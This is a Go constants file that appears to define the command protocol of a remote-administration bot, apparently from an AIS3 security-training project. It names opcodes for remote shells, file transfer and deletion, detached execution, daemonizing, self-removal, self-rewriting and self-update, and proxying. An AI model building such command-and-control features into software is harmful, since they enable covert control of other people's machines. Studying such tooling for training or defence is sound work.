package base

const (

	// initial
	initKeyTag = "HELLO"

	// Agent
	adminAgentTag = "AIS3 TEST TOOL"
	clientAgentTag = "AIS3 TEST BOT"

)


// ops for admin to hub
const (
	H_ls      = "l"
	H_sync    = "syn"
	H_fetch   = "f"
	H_select  = "s"
)

// ops for client
const (
	B_shk     = "sk"   // shell without exit
	B_shs     = "sh"   // shell server
	B_csh     = "csh"  // shell with option

	B_fs      = "fs"  // file ops
	B_push    = "put"  // pipe client to file
	B_get     = "get"  // pipe file to client
	B_del     = "del"  // del file
	B_pipe    = "pipe"  // pipe file and client TODO
	B_call    = "call" // exec file & detach

	B_dodaemon   = "daemon" // do daemon
	B_apoptosis  = "apoptosis" // remove self
	B_rebirth    = "rebirth" // write & exec self
	B_evolution    = "evolution" // update self

	B_info     = "info"    // pull info
	B_fast     = "j"    // fast proxy server
	B_reconn   = "reconn"    // reconnect
	B_kill     = "bye"    // kill self
)

